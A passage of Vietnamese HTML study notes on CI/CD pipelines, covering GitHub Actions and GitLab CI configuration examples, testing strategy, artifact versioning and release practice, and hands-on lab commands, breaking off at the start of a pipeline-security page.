+<div class="tw"><table><tr><th>Khái niệm</th><th>GitHub Actions</th><th>GitLab CI</th><th>Ý nghĩa</th></tr><tr><td>Định nghĩa</td><td><code>.github/workflows/*.yml</code></td><td><code>.gitlab-ci.yml</code></td><td>Pipeline là mã nằm trong repo</td></tr><tr><td>Kích hoạt</td><td><code>on:</code> (push, pull_request, schedule...)</td><td><code>rules:</code>/<code>workflow:</code></td><td>Khi nào chạy</td></tr><tr><td>Đơn vị công việc</td><td><code>job</code></td><td><code>job</code></td><td>Chạy trên một máy chạy (runner)</td></tr><tr><td>Bước</td><td><code>steps</code></td><td><code>script</code></td><td>Lệnh trong một job</td></tr><tr><td>Thứ tự</td><td><code>needs:</code></td><td><code>stages:</code> và <code>needs:</code></td><td>Job nào chờ job nào</td></tr><tr><td>Máy chạy</td><td><code>runs-on:</code> (runner)</td><td>runner với executor</td><td>Máy ảo/container thực thi</td></tr><tr><td>Cache</td><td><code>actions/cache</code></td><td><code>cache:</code></td><td>Giữ phụ thuộc giữa các lần chạy</td></tr><tr><td>Artifact</td><td><code>upload-artifact</code></td><td><code>artifacts:</code></td><td>Truyền kết quả giữa job và lưu lại</td></tr><tr><td>Bí mật</td><td><code>secrets.*</code></td><td>CI/CD variables (masked, protected)</td><td>Giá trị nhạy cảm</td></tr><tr><td>Môi trường</td><td><code>environment:</code></td><td><code>environment:</code></td><td>Nơi triển khai, có quy tắc bảo vệ</td></tr></table></div>
+<h2>Runner</h2>
+<p>Runner là máy thực thi job. Có hai loại:</p>
+<ul><li><b>Runner do nhà cung cấp lưu trữ</b> (hosted): máy sạch tạo mới cho mỗi job, không cần quản lý, nhưng có giới hạn tài nguyên và thời gian, và tính phí ngoài hạn mức.</li><li><b>Runner tự lưu trữ</b> (self-hosted): bạn kiểm soát cấu hình, mạng nội bộ, phần cứng. Đổi lại phải vận hành và <b>bảo mật</b>: runner tự lưu trữ chạy mã của pipeline nên không nên dùng cho repo công khai nhận pull request từ bên ngoài, và nên là <b>tạm thời (ephemeral)</b>, mỗi job một máy mới, để job không để lại dấu vết cho job sau.</li></ul>
+<h2>Bất biến và lặp lại được</h2>
+<p>Một pipeline tốt cho <b>cùng kết quả khi chạy lại</b> cùng một commit:</p>
+<ul><li>Ghim phiên bản công cụ, image nền, action; tránh <code>latest</code>.</li><li>Không phụ thuộc trạng thái còn lại trên runner (cache chỉ là tối ưu, không phải điều kiện đúng).</li><li>Không dùng thời gian hay giá trị ngẫu nhiên không kiểm soát trong build.</li><li>Artifact đặt tên theo commit và có thể truy ngược về pipeline sinh ra nó.</li></ul>
+<h2>Điều kiện chạy</h2>
+<p>Không phải mọi thay đổi cần chạy mọi thứ:</p>
+<div class="tw"><table><tr><th>Sự kiện</th><th>Gợi ý</th></tr><tr><td>Pull request</td><td>Lint, build, test, quét; <b>không</b> triển khai</td></tr><tr><td>Merge vào nhánh chính</td><td>Đầy đủ: build, test, đóng gói, xuất bản, triển khai dev/staging</td></tr><tr><td>Tag phát hành</td><td>Đóng gói bản chính thức, triển khai production (hoặc chờ duyệt)</td></tr><tr><td>Theo lịch</td><td>Quét lỗ hổng định kỳ, kiểm thử chậm, phát hiện drift</td></tr><tr><td>Thủ công</td><td>Triển khai lại, chạy tác vụ bảo trì</td></tr></table></div>
+<p>Dùng bộ lọc đường dẫn để bỏ qua việc không liên quan (chỉ đổi tài liệu thì không cần build image): xem <a href="#pipeline-ops">Hiệu năng pipeline</a>.</p>
+<div class="callout lab"><b>Vẽ pipeline của dự án bạn</b><p>Trên giấy hoặc bằng ASCII, vẽ pipeline lý tưởng cho một dịch vụ web của bạn: liệt kê từng giai đoạn, bước nào song song, bước nào chặn (blocking), thời gian ước lượng của mỗi bước, và điều kiện kích hoạt (PR, merge, tag). Sau đó so với pipeline thật đang có: thiếu giai đoạn nào, bước nào chậm nhất?</p></div>
+</article>
+<article class="page" data-id="gha" data-group="Pipeline" data-title="GitHub Actions" hidden>
+<h1>GitHub Actions</h1>
+<p class="lead">GitHub Actions chạy workflow định nghĩa bằng YAML trong repo, kích hoạt bởi sự kiện của GitHub. Trang này gồm các khái niệm, một workflow CI hoàn chỉnh, cache, matrix, môi trường, workflow tái sử dụng và các điểm bảo mật cần nhớ.</p>
+<h2>Khái niệm</h2>
+<div class="tw"><table><tr><th>Thành phần</th><th>Ý nghĩa</th></tr><tr><td><b>Workflow</b></td><td>Một tệp YAML trong <code>.github/workflows/</code></td></tr><tr><td><b>Event</b></td><td>Sự kiện kích hoạt: <code>push</code>, <code>pull_request</code>, <code>workflow_dispatch</code> (thủ công), <code>schedule</code> (cron), <code>release</code>, <code>workflow_call</code></td></tr><tr><td><b>Job</b></td><td>Nhóm bước chạy trên một runner; các job chạy <b>song song</b> trừ khi có <code>needs</code></td></tr><tr><td><b>Step</b></td><td>Một lệnh (<code>run</code>) hoặc một action (<code>uses</code>)</td></tr><tr><td><b>Action</b></td><td>Đơn vị tái sử dụng (<code>actions/checkout</code>, <code>docker/build-push-action</code>...)</td></tr><tr><td><b>Runner</b></td><td>Máy chạy job (<code>ubuntu-latest</code>, hoặc tự lưu trữ)</td></tr><tr><td><b>Context</b></td><td>Biến truy cập bằng <code>${{ ... }}</code>: <code>github</code>, <code>env</code>, <code>secrets</code>, <code>vars</code>, <code>needs</code>, <code>matrix</code></td></tr></table></div>
+<h2>Workflow CI hoàn chỉnh</h2>
+<pre><code>name: ci
+on:
+  pull_request:
+  push:
+    branches: [main]
+
+permissions:
+  contents: read              # quyền tối thiểu cho GITHUB_TOKEN
+
+concurrency:
+  group: ci-${{ github.ref }}
+  cancel-in-progress: true    # huỷ lần chạy cũ khi có commit mới trên cùng nhánh
+
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+          cache: pip
+      - run: pip install ruff
+      - run: ruff check .
+
+  test:
+    needs: lint
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        python: ["3.11", "3.12"]
+    services:
+      postgres:
+        image: postgres:16
+        env:
+          POSTGRES_PASSWORD: test
+        ports: ["5432:5432"]
+        options: &gt;-
+          --health-cmd "pg_isready -U postgres"
+          --health-interval 5s --health-retries 10
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: ${{ matrix.python }}
+          cache: pip
+      - run: pip install -r requirements.txt
+      - run: pytest --maxfail=1 -q
+        env:
+          DATABASE_URL: postgresql://postgres:test@localhost:5432/postgres
+
+  build:
+    needs: test
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/setup-buildx-action@v3
+      - uses: docker/build-push-action@v6
+        with:
+          context: .
+          push: false
+          tags: app:${{ github.sha }}
+          cache-from: type=gha
+          cache-to: type=gha,mode=max</code></pre>
+<p>Các điểm cần nhớ:</p>
+<ul><li><b><code>permissions</code></b> đặt ở đầu workflow để token tự động của job chỉ có quyền cần thiết (mặc định có thể rộng hơn); mở thêm quyền ở job nào thật sự cần.</li><li><b><code>concurrency</code></b> tránh nhiều lần chạy chồng nhau (và tiết kiệm phút chạy). Với job triển khai production nên <b>không</b> huỷ giữa chừng (<code>cancel-in-progress: false</code>), chỉ xếp hàng.</li><li><b><code>needs</code></b> tạo thứ tự; job không <code>needs</code> nhau chạy song song.</li><li><b><code>matrix</code></b> chạy cùng job với nhiều tổ hợp tham số (phiên bản ngôn ngữ, hệ điều hành); <code>fail-fast: false</code> để một tổ hợp lỗi không huỷ các tổ hợp còn lại.</li><li><b><code>services</code></b> dựng container phụ thuộc (database) cho job kiểm thử, với healthcheck.</li><li><b>Cache</b>: <code>setup-python</code> có <code>cache: pip</code>, hoặc dùng <code>actions/cache</code> với khoá theo hash của tệp khoá phụ thuộc. Cache Docker layer qua <code>cache-from/cache-to</code> của buildx.</li></ul>
+<h2>Truyền dữ liệu giữa các bước và job</h2>
+<pre><code>steps:
+  - id: ver
+    run: echo "version=$(cat VERSION)" &gt;&gt; "$GITHUB_OUTPUT"       # đầu ra của bước
+  - run: echo "Phiên bản ${{ steps.ver.outputs.version }}"
+
+jobs:
+  build:
+    outputs:
+      version: ${{ steps.ver.outputs.version }}                 # đầu ra của job
+    # ...
+  deploy:
+    needs: build
+    steps:
+      - run: echo "Triển khai ${{ needs.build.outputs.version }}"</code></pre>
+<p>Truyền tệp giữa job bằng <code>actions/upload-artifact</code> và <code>actions/download-artifact</code>.</p>
+<h2>Môi trường và duyệt thủ công</h2>
+<pre><code>deploy-prod:
+  needs: deploy-stg
+  runs-on: ubuntu-latest
+  environment: production        # bảo vệ: người duyệt bắt buộc, giới hạn nhánh, bí mật riêng
+  steps:
+    - run: ./deploy.sh production</code></pre>
+<p>Trong phần cài đặt repo, môi trường <code>production</code> có thể yêu cầu <b>người duyệt</b>, <b>chỉ nhánh <code>main</code> mới được triển khai</b>, và có <b>bí mật/biến riêng</b> cho môi trường đó. Job dừng chờ duyệt trước khi chạy.</p>
+<h2>Workflow tái sử dụng</h2>
+<p>Tránh lặp pipeline giữa nhiều repo bằng workflow có <code>workflow_call</code>:</p>
+<pre><code><span class="cm"># .github/workflows/build-image.yml  (trong repo "platform-workflows")</span>
+on:
+  workflow_call:
+    inputs:
+      image-name: {type: string, required: true}
+    secrets:
+      registry-token: {required: true}
+
+<span class="cm"># nơi gọi</span>
+jobs:
+  image:
+    uses: myorg/platform-workflows/.github/workflows/build-image.yml@v1
+    with: {image-name: web}
+    secrets:
+      registry-token: ${{ secrets.REGISTRY_TOKEN }}</code></pre>
+<p>Ghim phiên bản (<code>@v1</code>, hoặc mã băm commit) cho workflow tái sử dụng và cho action của bên thứ ba.</p>
+<h2>Bảo mật workflow: những điều bắt buộc biết</h2>
+<ul><li><b>Ghim action theo mã băm commit đầy đủ</b> thay vì tag di động (<code>uses: actions/checkout@&lt;sha&gt;</code>), nhất là action của bên thứ ba: tag có thể bị đổi sang mã độc (<a href="#pipeline-security">Bảo mật pipeline</a>).</li><li><b><code>pull_request_target</code></b> chạy với quyền ghi và bí mật của repo gốc ngay cả với PR từ fork: <b>không bao giờ</b> checkout và chạy mã của PR trong workflow này.</li><li><b>Chèn script (script injection)</b>: không đặt dữ liệu người dùng kiểm soát (tiêu đề PR, tên nhánh) trực tiếp vào <code>run:</code> bằng <code>${{ ... }}</code>; truyền qua biến môi trường.</li><li>Dùng <b>OIDC</b> để lấy quyền cloud ngắn hạn thay vì lưu khoá dài hạn (<a href="#secrets-oidc">Bí mật và OIDC</a>).</li><li>Với repo công khai, đừng dùng runner tự lưu trữ không tạm thời.</li></ul>
+<div class="callout lab"><b>Chạy thử một workflow trên máy</b><pre><code><span class="cm"># trong một repo thử có Python</span>
+mkdir -p .github/workflows
+cat &gt; .github/workflows/ci.yml &lt;&lt;'EOF'
+name: ci
+on: [push, pull_request]
+permissions:
+  contents: read
+jobs:
+  hello:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: echo "Xin chào từ workflow, commit ${{ github.sha }}"
+      - run: python3 -c "print(2+2)"
+EOF
+actionlint                       # kiểm tra cú pháp (nếu đã cài)
+act -j hello                     # chạy thử cục bộ bằng Docker (nếu đã cài act)
+git add . &amp;&amp; git commit -m "ci: thêm workflow" &amp;&amp; git push</code></pre>
+<p>Mở tab Actions trên GitHub, xem log từng bước. Thêm một bước cố ý lỗi và quan sát việc các bước sau bị bỏ qua thế nào.</p></div>
+</article>
+<article class="page" data-id="gitlab-others" data-group="Pipeline" data-title="GitLab CI và các công cụ khác" hidden>
+<h1>GitLab CI và các công cụ khác</h1>
+<p class="lead">Nhiều nền tảng CI/CD có cùng mô hình với khác biệt cú pháp. Biết GitLab CI và bản đồ các công cụ giúp bạn chuyển đổi và chọn đúng khi cần.</p>
+<h2>GitLab CI/CD</h2>
+<p>Pipeline định nghĩa trong <code>.gitlab-ci.yml</code> ở gốc repo. Job nhóm thành <b>stage</b>; các stage chạy tuần tự, job trong cùng stage chạy song song.</p>
+<pre><code>stages: [lint, test, build, deploy]
+
+default:
+  image: python:3.12-slim
+  cache:
+    key:
+      files: [requirements.txt]
+    paths: [.cache/pip]
+
+variables:
+  PIP_CACHE_DIR: "$CI_PROJECT_DIR/.cache/pip"
+
+workflow:
+  rules:
+    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+
+lint:
+  stage: lint
+  script:
+    - pip install ruff
+    - ruff check .
+
+unit-test:
+  stage: test
+  needs: [lint]
+  script:
+    - pip install -r requirements.txt
+    - pytest --junitxml=report.xml
+  artifacts:
+    when: always
+    reports:
+      junit: report.xml
+
+build-image:
+  stage: build
+  image: docker:27
+  services: [docker:27-dind]
+  script:
+    - docker build -t "$CI_REGISTRY_IMAGE:$CI_COMMIT_SHA" .
+    - echo "$CI_REGISTRY_PASSWORD" | docker login -u "$CI_REGISTRY_USER" --password-stdin "$CI_REGISTRY"
+    - docker push "$CI_REGISTRY_IMAGE:$CI_COMMIT_SHA"
+  rules:
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+
+deploy-prod:
+  stage: deploy
+  environment:
+    name: production
+    url: https://app.example.com
+  script:
+    - ./deploy.sh production "$CI_COMMIT_SHA"
+  rules:
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+      when: manual            # chờ nhấn tay
+  resource_group: production  # không cho hai lần triển khai chạy cùng lúc</code></pre>
+<p>Từ khoá chính:</p>
+<div class="tw"><table><tr><th>Từ khoá</th><th>Ý nghĩa</th></tr><tr><td><code>stages</code>, <code>stage</code></td><td>Thứ tự các nhóm job</td></tr><tr><td><code>needs</code></td><td>Chạy ngay khi job phụ thuộc xong, không đợi cả stage (tạo đồ thị DAG)</td></tr><tr><td><code>rules</code></td><td>Điều kiện chạy job (thay <code>only</code>/<code>except</code> cũ): <code>if</code>, <code>changes</code>, <code>when</code></td></tr><tr><td><code>workflow: rules</code></td><td>Quyết định cả pipeline có được tạo không</td></tr><tr><td><code>artifacts</code>, <code>cache</code></td><td>Truyền kết quả giữa job; giữ phụ thuộc giữa các lần chạy</td></tr><tr><td><code>environment</code></td><td>Gắn job với môi trường, có theo dõi lịch sử triển khai</td></tr><tr><td><code>extends</code>, <code>include</code>, <code>!reference</code></td><td>Tái sử dụng cấu hình trong và giữa các repo</td></tr><tr><td><code>variables</code></td><td>Biến; biến nhạy cảm đặt trong phần CI/CD settings dạng <b>masked</b> và <b>protected</b></td></tr><tr><td><code>resource_group</code></td><td>Tuần tự hoá các job cùng nhóm (tránh triển khai chồng nhau)</td></tr></table></div>
+<p>Runner của GitLab có nhiều <b>executor</b> (shell, Docker, Kubernetes...). Với executor Docker và việc build image, có ba lựa chọn: Docker-in-Docker (cần chế độ privileged), gắn socket Docker của host (rủi ro bảo mật cao), hoặc công cụ build không cần daemon như Kaniko hay Buildah.</p>
+<h2>So sánh nhanh</h2>
+<div class="tw"><table><tr><th></th><th>GitHub Actions</th><th>GitLab CI</th><th>Jenkins</th></tr><tr><td>Cấu hình</td><td>YAML trong <code>.github/workflows</code></td><td>YAML <code>.gitlab-ci.yml</code></td><td><code>Jenkinsfile</code> (Groovy)</td></tr><tr><td>Hạ tầng</td><td>Hosted hoặc tự lưu trữ</td><td>Hosted hoặc tự lưu trữ</td><td><b>Tự vận hành</b> controller và agent</td></tr><tr><td>Hệ sinh thái</td><td>Marketplace action rất lớn</td><td>Template, tích hợp chặt với DevOps platform của GitLab</td><td>Hàng nghìn plugin (cần bảo trì và vá lỗi)</td></tr><tr><td>Điểm mạnh</td><td>Gần mã nguồn GitHub, dễ bắt đầu</td><td>Một nền tảng cho mã, CI, registry, bảo mật</td><td>Linh hoạt tối đa, cài đặt on-prem</td></tr><tr><td>Điểm cần lưu ý</td><td>Bảo mật action bên thứ ba</td><td>Cấu hình runner/executor</td><td>Gánh nặng vận hành, nợ plugin</td></tr></table></div>
+<h2>Bản đồ công cụ khác</h2>
+<div class="tw"><table><tr><th>Công cụ</th><th>Ghi chú</th></tr><tr><td><b>Jenkins</b></td><td>Lâu đời, tự lưu trữ, rất linh hoạt; pipeline khai báo (<code>pipeline { agent ... stages ... }</code>) và thư viện dùng chung. Chi phí nằm ở vận hành và nâng cấp plugin</td></tr><tr><td><b>CircleCI, Buildkite, Drone, Travis...</b></td><td>CI dạng dịch vụ hoặc tự lưu trữ với mô hình tương tự</td></tr><tr><td><b>Tekton, Argo Workflows</b></td><td>Pipeline chạy <b>bên trong Kubernetes</b> như resource; phù hợp nền tảng nội bộ cloud-native</td></tr><tr><td><b>Dagger</b> và các công cụ pipeline "portable"</td><td>Viết pipeline bằng mã, chạy giống hệt trên máy cá nhân và trên mọi CI</td></tr><tr><td><b>Argo CD, Flux</b></td><td>Không phải CI mà là <b>CD kiểu GitOps</b> cho Kubernetes (<a href="#gitops-cd">GitOps</a>)</td></tr></table></div>
+<h2>Tránh bị khoá vào một nền tảng</h2>
+<p>Một số thói quen giảm chi phí khi đổi công cụ:</p>
+<ul><li>Đặt <b>logic thật</b> vào script trong repo (<code>make test</code>, <code>./scripts/build.sh</code>) hoặc công cụ như Dagger; file pipeline chỉ <b>gọi</b> chúng. Chạy được trên máy bạn bằng đúng lệnh mà CI chạy.</li><li>Dùng <code>Makefile</code> hoặc task runner để thống nhất lệnh: <code>make lint</code>, <code>make test</code>, <code>make build</code>.</li><li>Ghim phiên bản công cụ qua image hoặc tệp phiên bản, không phụ thuộc cấu hình ngầm của runner.</li></ul>
+<div class="callout lab"><b>Đặt logic vào script, pipeline chỉ gọi</b><pre><code>mkdir -p ~/ci-lab/scripts &amp;&amp; cd ~/ci-lab
+cat &gt; Makefile &lt;&lt;'EOF'
+.PHONY: lint test build ci
+lint:
+	@echo "lint ok"
+test:
+	@python3 -c "assert 2+2==4; print('test ok')"
+build:
+	@echo "build $$(git rev-parse --short HEAD 2&gt;/dev/null || echo local)"
+ci: lint test build
+EOF
+git init -q . 2&gt;/dev/null; make ci</code></pre>
+<p>Sau đó viết cả hai: một workflow GitHub Actions và một <code>.gitlab-ci.yml</code>, mỗi cái chỉ chạy <code>make ci</code>. So sánh hai tệp: phần nào khác nhau, phần nào giống?</p></div>
+</article>
+<article class="page" data-id="testing-strategy" data-group="Pipeline" data-title="Chiến lược kiểm thử trong pipeline" hidden>
+<h1>Chiến lược kiểm thử trong pipeline</h1>
+<p class="lead">Pipeline chỉ tốt bằng các bài kiểm thử trong nó. Chiến lược kiểm thử quyết định pipeline vừa nhanh vừa bắt được lỗi thật.</p>
+<h2>Kim tự tháp kiểm thử</h2>
+<pre class="ascii"><code>          /\
+         /  \        E2E / UI: ít, chậm, dễ vỡ, kiểm tra luồng người dùng thật
+        /----\
+       /      \      Tích hợp / API / contract: vừa phải, kiểm tra các phần nói chuyện với nhau
+      /--------\
+     /          \    Đơn vị: nhiều, nhanh, kiểm tra logic từng phần
+    /____________\</code></pre>
+<div class="tw"><table><tr><th>Tầng</th><th>Đặc điểm</th><th>Chạy khi nào</th></tr><tr><td>Đơn vị (unit)</td><td>Mili giây, không cần mạng hay database thật</td><td>Mọi commit</td></tr><tr><td>Tích hợp</td><td>Dùng database, hàng đợi thật (container)</td><td>Mọi PR, hoặc song song</td></tr><tr><td>Hợp đồng (contract)</td><td>Kiểm tra API giữa dịch vụ không bị phá vỡ (ví dụ Pact)</td><td>Khi đổi giao diện dịch vụ</td></tr><tr><td>End-to-end</td><td>Mô phỏng người dùng qua giao diện</td><td>Sau khi triển khai staging; số lượng nhỏ, tập trung vào luồng quan trọng</td></tr><tr><td>Smoke</td><td>Vài kiểm tra "dịch vụ còn sống" sau triển khai</td><td>Mỗi lần triển khai</td></tr><tr><td>Hiệu năng, tải</td><td>Đo độ trễ và công suất</td><td>Theo lịch, hoặc trước phát hành lớn</td></tr></table></div>
+<p>Quy tắc: nhiều test nhanh ở dưới, ít test chậm ở trên. Pipeline "kim tự tháp ngược" (chủ yếu E2E) chậm, vỡ ngẫu nhiên và khó tìm nguyên nhân.</p>
+<h2>Test không ổn định (flaky)</h2>
+<p>Test lúc đỏ lúc xanh không đổi mã là kẻ phá hoại niềm tin vào pipeline: người ta bắt đầu bấm "chạy lại" thay vì điều tra, rồi bỏ qua cả những lỗi thật.</p>
+<ul><li><b>Đo</b>: theo dõi test nào hay vỡ ngẫu nhiên (nhiều nền tảng có báo cáo), đừng chỉ dựa vào cảm giác.</li><li><b>Cách ly (quarantine)</b>: chuyển test flaky sang nhóm riêng không chặn pipeline, nhưng <b>có người chịu trách nhiệm sửa</b> và có hạn.</li><li><b>Nguyên nhân thường gặp</b>: phụ thuộc thứ tự chạy, thời gian (<code>sleep</code> cố định), dữ liệu dùng chung giữa test, dịch vụ ngoài, tài nguyên chạy song song tranh nhau. Sửa gốc thay vì thêm <code>retry</code>.</li><li>Tự động chạy lại (retry) chỉ nên là biện pháp tạm, có ghi nhận mỗi lần retry.</li></ul>
+<h2>Dữ liệu và môi trường kiểm thử</h2>
+<ul><li>Dựng dịch vụ phụ thuộc bằng container ngay trong pipeline (<code>services</code> của Actions, Testcontainers) để môi trường kiểm thử giống nhau mọi nơi.</li><li>Dữ liệu kiểm thử tạo trong chính test (hoặc fixture) và dọn sau; không dựa vào dữ liệu có sẵn trên môi trường dùng chung.</li><li>Mỗi test độc lập: chạy theo thứ tự nào cũng được, chạy song song được.</li><li>Không dùng dữ liệu production thật; nếu cần, ẩn danh trước.</li></ul>
+<h2>Cổng chất lượng (quality gate)</h2>
+<p>Điều kiện tối thiểu để một thay đổi được đi tiếp, ví dụ:</p>
+<ul><li>Tất cả test bắt buộc qua; lint và định dạng đạt.</li><li>Quét bảo mật không có lỗ hổng mức cao đã có bản vá.</li><li>Độ phủ mã không giảm dưới ngưỡng thoả thuận.</li><li>Có review từ ít nhất một người (bảo vệ nhánh).</li></ul>
+<p><b>Độ phủ (coverage)</b> là chỉ số hữu ích để tìm chỗ <b>chưa có</b> kiểm thử, nhưng không chứng minh chất lượng test: phủ 90% mà không có assertion vẫn vô nghĩa. Đừng biến nó thành mục tiêu để chạy theo; kết hợp với review test và, khi cần, kiểm thử đột biến (mutation testing) để đo khả năng bắt lỗi thật.</p>
+<h2>Tăng tốc mà không giảm chất lượng</h2>
+<ul><li><b>Chia test thành nhiều job chạy song song</b> (sharding) theo thời gian chạy trước đó.</li><li><b>Chỉ chạy test liên quan</b> đến thay đổi (bộ lọc đường dẫn, phân tích phụ thuộc) trên PR; chạy đầy đủ trên nhánh chính.</li><li><b>Cache</b> phụ thuộc và kết quả build.</li><li>Đưa test nhanh và quan trọng lên đầu để phản hồi sớm; test chậm chạy song song hoặc sau.</li></ul>
+<div class="callout lab"><b>Đo thời gian và độ ổn định của bộ test</b><pre><code><span class="cm"># với một dự án có test (ví dụ pytest)</span>
+for i in $(seq 1 5); do pytest -q --durations=5 -p no:cacheprovider 2&gt;&amp;1 | tail -3; done
+pytest -q --durations=10                           # 10 test chậm nhất
+pytest -q -p no:randomly -x                        # dừng ở lỗi đầu tiên</code></pre>
+<p>Ghi lại: bộ test chạy mất bao lâu? Test nào chậm nhất và liệu có thể chuyển xuống tầng thấp hơn? Có test nào kết quả không giống nhau giữa các lần chạy?</p></div>
+</article>
+<article class="page" data-id="artifacts" data-group="Pipeline" data-title="Artifact, phiên bản và phát hành" hidden>
+<h1>Artifact, phiên bản và phát hành</h1>
+<p class="lead">Artifact là sản phẩm của build (image, gói, tệp nhị phân). Cách bạn đặt phiên bản, lưu trữ và truy ngược artifact quyết định việc triển khai có đáng tin cậy và quay lui được hay không.</p>
+<h2>Build một lần, triển khai nhiều nơi</h2>
+<p>Artifact được tạo <b>một lần</b> trong pipeline rồi đi qua dev, staging, production. Không build lại cho từng môi trường: build lại có thể cho kết quả khác (phụ thuộc đổi, thời gian) nên thứ bạn kiểm thử ở staging không còn là thứ chạy ở production.</p>
+<pre class="ascii"><code>   commit --&gt; build ONE image (tag: git SHA) --&gt; push registry
+                                                     |
+                      +------------------------------+------------------------------+
+                      v                              v                              v
+                  deploy dev                   deploy staging                  deploy prod
+                (cùng image, config khác)   (cùng image, config khác)       (cùng image, config khác)</code></pre>
+<p>Khác biệt giữa môi trường nằm ở <b>cấu hình</b> (biến môi trường, ConfigMap, Secret), không nằm trong artifact.</p>
+<h2>Đặt phiên bản</h2>
+<p><b>Semantic Versioning</b> (<code>MAJOR.MINOR.PATCH</code>): tăng MAJOR khi thay đổi phá vỡ tương thích, MINOR khi thêm tính năng tương thích, PATCH khi sửa lỗi.</p>
+<div class="tw"><table><tr><th>Định danh</th><th>Dùng để</th></tr><tr><td><b>Git SHA</b> (<code>3f1a9c2</code>)</td><td>Truy ngược chính xác commit; tag chính cho mọi artifact CI sinh ra</td></tr><tr><td><b>Semver</b> (<code>1.4.2</code>)</td><td>Phát hành chính thức; gắn với tag Git <code>v1.4.2</code></td></tr><tr><td>Tag di động (<code>main</code>, <code>1.4</code>)</td><td>Tiện cho người dùng, <b>không</b> dùng để triển khai production</td></tr><tr><td><b>Digest</b> (<code>sha256:...</code>)</td><td>Bất biến tuyệt đối; dùng khi triển khai</td></tr><tr><td><code>latest</code></td><td>Tránh dùng để triển khai</td></tr></table></div>
+<p>Quy tắc: <b>mọi artifact truy ngược được tới commit và pipeline</b>. Gắn metadata: nhãn OCI (<code>org.opencontainers.image.revision</code>, <code>.source</code>, <code>.version</code>), và ghi lại digest trong bản ghi triển khai.</p>
+<h2>Phiên bản tự động từ commit</h2>
+<p><b>Conventional Commits</b> quy ước thông điệp commit có tiền tố: <code>feat:</code> (tính năng, tăng MINOR), <code>fix:</code> (sửa lỗi, tăng PATCH), <code>feat!:</code> hoặc <code>BREAKING CHANGE:</code> (tăng MAJOR), và <code>docs:</code>, <code>chore:</code>, <code>refactor:</code>... Công cụ như <code>semantic-release</code> hoặc <code>release-please</code> đọc lịch sử commit để <b>tự tính phiên bản kế tiếp, tạo tag, changelog và release</b>:</p>
+<pre><code>feat(api): thêm tham số lọc theo ngày
+fix(auth): sửa lỗi hết hạn token sớm
+feat(api)!: đổi định dạng phản hồi của /orders</code></pre>
+<p>Cách này làm việc phát hành lặp lại được và giảm tranh cãi "nên là phiên bản mấy", nhưng đòi hỏi cả nhóm viết commit theo quy ước (có thể kiểm tra bằng công cụ lint commit trong CI).</p>
+<h2>Lưu trữ artifact</h2>
+<div class="tw"><table><tr><th>Loại</th><th>Nơi lưu</th></tr><tr><td>Container image</td><td>Registry OCI (GHCR, ECR, Harbor...): xem <a href="https://tracviethustcs.github.io/docker-container-notes/#registry" target="_blank" rel="noopener">Registry</a></td></tr><tr><td>Gói thư viện</td><td>npm, PyPI, Maven, NuGet (kho riêng hoặc công cộng)</td></tr><tr><td>Tệp nhị phân, bản phát hành</td><td>Kho artifact (Artifactory, Nexus), release của Git, bucket đối tượng</td></tr><tr><td>Biểu đồ Helm</td><td>Registry OCI hoặc kho chart</td></tr></table></div>
+<p>Cần có <b>chính sách giữ lại</b> (retention): xoá artifact cũ theo tuổi, nhưng <b>giữ</b> mọi bản đã từng phát hành production để quay lui và truy vết. Tách kho cho artifact tạm của CI và kho cho bản phát hành.</p>
+<h2>Xuất bản kèm bằng chứng</h2>
+<p>Artifact đáng tin cậy khi biết nó đến từ đâu và chứa gì:</p>
+<ul><li><b>SBOM</b> (danh sách thành phần), <b>chữ ký</b> (cosign) và <b>chứng thực nguồn gốc (provenance)</b> ghi lại commit, pipeline và người build. Khung SLSA định nghĩa các mức bảo đảm cho chuỗi cung ứng.</li><li>Môi trường triển khai (hoặc policy engine như Kyverno) <b>xác minh</b> chữ ký trước khi chạy.</li></ul>
+<p>Xem chi tiết kỹ thuật ở <a href="https://tracviethustcs.github.io/k8s-study-notes/#adv-supply-chain" target="_blank" rel="noopener">Bảo mật chuỗi cung ứng image</a> và <a href="#pipeline-security">Bảo mật pipeline</a>.</p>
+<h2>Promotion: nâng cấp artifact, không build lại</h2>
+<p>Đưa một bản lên môi trường kế tiếp nghĩa là <b>chỉ định artifact đã có</b> cho môi trường đó (đổi tag/digest trong cấu hình hoặc repo GitOps), không phải build lại. "Promotion" có thể là gắn thêm tag (<code>1.4.2</code> đã qua staging), hoặc cập nhật tham chiếu trong repo cấu hình (<a href="#gitops-cd">GitOps</a>).</p>
+<div class="callout lab"><b>Tag theo SHA và theo semver từ cùng một image</b><pre><code>mkdir -p ~/art &amp;&amp; cd ~/art &amp;&amp; git init -q . &amp;&amp; printf 'FROM alpine:3.20\nCMD ["echo","xin chào"]\n' &gt; Dockerfile
+git add . &amp;&amp; git -c user.name=t -c user.email=t@t commit -qm "feat: bản đầu"
+SHA=$(git rev-parse --short HEAD)
+docker build -q -t demo:$SHA --label org.opencontainers.image.revision=$(git rev-parse HEAD) .
+docker tag demo:$SHA demo:1.0.0                      # semver trỏ tới CÙNG một image, không build lại
+docker image ls demo; docker image ls --digests demo
+docker inspect -f '{{index .Config.Labels "org.opencontainers.image.revision"}}' demo:1.0.0</code></pre>
+<p>Quan sát: hai tag có cùng IMAGE ID/digest không? Từ image đang chạy, bạn truy ngược về commit nào bằng cách nào?</p></div>
+</article>
+<article class="page" data-id="pipeline-security" data-group="An toàn" data-title="Bảo mật pipeline (DevSecOps)" hidden>
+<h1>Bảo mật pipeline (DevSecOps)</h1>
+<p class="lead">Pipeline có quyền sâu: đọc mã, giữ bí mật, đẩy artifact và triển khai production. Kẻ tấn công chiếm được pipeline thì chiếm được mọi thứ phía sau. Bảo mật pipeline gồm hai phần: kiểm tra bảo mật <b>trong</b> pipeline và bảo vệ <b>chính</b> pipeline.</p>
+<h2>Kiểm tra bảo mật trong pipeline</h2>
